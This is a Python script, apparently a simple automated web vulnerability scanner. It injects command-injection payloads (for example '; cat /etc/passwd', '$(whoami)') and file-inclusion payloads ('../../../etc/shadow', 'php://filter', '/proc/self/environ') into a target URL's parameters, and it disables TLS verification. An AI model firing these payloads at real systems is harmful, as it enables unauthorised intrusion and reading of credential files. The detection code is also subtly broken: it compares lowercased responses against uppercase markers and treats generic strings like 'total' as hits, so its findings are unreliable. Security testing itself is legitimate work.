#!/usr/bin/env python3
import requests
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs
import json
from datetime import datetime
from requests.exceptions import RequestException, Timeout, ConnectionError
import warnings

warnings.filterwarnings('ignore')

class AutoVulnerabilityScanner:
    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = True):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []
        
        self.command_injection_payloads = [
            '; whoami', '| whoami', '`whoami`', '$(whoami)',
            '; id', '| id', '`id`', '$(id)',
            '; ls -la', '| ls -la', '; cat /etc/passwd', '| cat /etc/passwd',
            '`cat /etc/passwd`', '$(cat /etc/passwd)', '&& whoami', '|| whoami',
        ]
        
        self.lfi_payloads = [
            '../../../etc/passwd', '../../etc/passwd', '../etc/passwd',
            '....//....//....//etc/passwd', '../../../etc/passwd%00',
            '../../../etc/shadow', '../../../proc/self/environ',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input', '/etc/passwd', 'file:///etc/passwd',
        ]
        
        self.ci_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'uid=', 'gid=', 'groups=', 'total', 'drwx',
        ]
        
        self.lfi_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'nologin', '<?php', '<?=', 'USER=', 'PATH=', 'HOME=',
        ]
        
        self.scan_results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'scan_status': 'In Progress',
            'vulnerabilities': [],
            'scan_type': 'AUTOMATIC',
            'payloads_tested': {
                'command_injection': len(self.command_injection_payloads),
                'file_inclusion': len(self.lfi_payloads),
                'total_payloads': len(self.command_injection_payloads) + len(self.lfi_payloads)
            }
        }
    
    def log(self, message: str):
        if self.verbose:
            print(message)
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for key, value_list in query_params.items():
                params[key] = value_list[0] if value_list else ''
        
        return params
    
    def auto_scan_command_injection(self) -> List[Dict]:
        results = []
        params = self.extract_parameters(self.target_url)
        
        if not params:
            self.log("[!] No parameters found")
            return results
        
        self.log(f"\n[AUTO] Found {len(params)} parameter(s): {list(params.keys())}")
        self.log(f"[AUTO] Testing {len(self.command_injection_payloads)} command injection payloads automatically...")
        
        base_url = self.target_url.split('?')[0]
        
        for param_name in params.keys():
            for idx, payload in enumerate(self.command_injection_payloads, 1):
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(
                        base_url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    vulnerable = any(indicator in response.text.lower() for indicator in self.ci_indicators)
                    
                    if vulnerable:
                        result = {
                            'type': 'Command Injection',
                            'severity': 'CRITICAL',
                            'url': base_url,
                            'parameter': param_name,
                            'payload': payload,
                            'vulnerable': True,
                            'status_code': response.status_code,
                        }
                        results.append(result)
                        self.vulnerabilities.append(result)
                        self.log(f"[FOUND] CRITICAL - Command Injection on '{param_name}' with payload: {payload}")
                
                except (RequestException, Timeout, ConnectionError):
                    pass
        
        return results
    
    def auto_scan_file_inclusion(self) -> List[Dict]:
        results = []
        params = self.extract_parameters(self.target_url)
        
        if not params:
            return results
        
        self.log(f"\n[AUTO] Testing {len(self.lfi_payloads)} file inclusion payloads automatically...")
        
        base_url = self.target_url.split('?')[0]
        
        for param_name in params.keys():
            for idx, payload in enumerate(self.lfi_payloads, 1):
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.session.get(
                        base_url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    vulnerable = any(indicator in response.text.lower() for indicator in self.lfi_indicators)
                    
                    if vulnerable:
                        result = {
                            'type': 'File Inclusion (LFI)',
                            'severity': 'HIGH',
                            'url': base_url,
                            'parameter': param_name,
                            'payload': payload,
                            'vulnerable': True,
                            'status_code': response.status_code,
                        }
                        results.append(result)
                        self.vulnerabilities.append(result)
                        self.log(f"[FOUND] HIGH - File Inclusion on '{param_name}' with payload: {payload}")
                
                except (RequestException, Timeout, ConnectionError):
                    pass
        
        return results
    
    def run_automatic_scan(self) -> Dict:
        print("\n" + "="*70)
        print("🔐 AUTOMATIC VULNERABILITY SCANNER")
        print("="*70)
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Mode: FULLY AUTOMATIC")
        print(f"[+] Total payloads to test: {self.scan_results['payloads_tested']['total_payloads']}")
        print("="*70)
        
        self.log("\n[*] PHASE 1: Command Injection Detection")
        print("-"*70)
        ci_results = self.auto_scan_command_injection()
        
        self.log("\n\n[*] PHASE 2: File Inclusion Detection")
        print("-"*70)
        lfi_results = self.auto_scan_file_inclusion()
        
        self.scan_results['vulnerabilities'] = self.vulnerabilities
        self.scan_results['summary'] = {
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical_count': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high_count': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
            'command_injection_found': len(ci_results),
            'file_inclusion_found': len(lfi_results),
        }
        self.scan_results['scan_status'] = 'Completed'
        
        print("\n" + "="*70)
        print("[+] SCAN COMPLETED")
        print("="*70)
        print(f"[+] Vulnerabilities Found: {self.scan_results['summary']['total_vulnerabilities']}")
        print(f"    ├─ CRITICAL: {self.scan_results['summary']['critical_count']}")
        print(f"    └─ HIGH: {self.scan_results['summary']['high_count']}")
        print(f"\n[+] Details:")
        print(f"    ├─ Command Injection: {self.scan_results['summary']['command_injection_found']}")
        print(f"    └─ File Inclusion: {self.scan_results['summary']['file_inclusion_found']}")
        print("="*70 + "\n")
        
        return self.scan_results
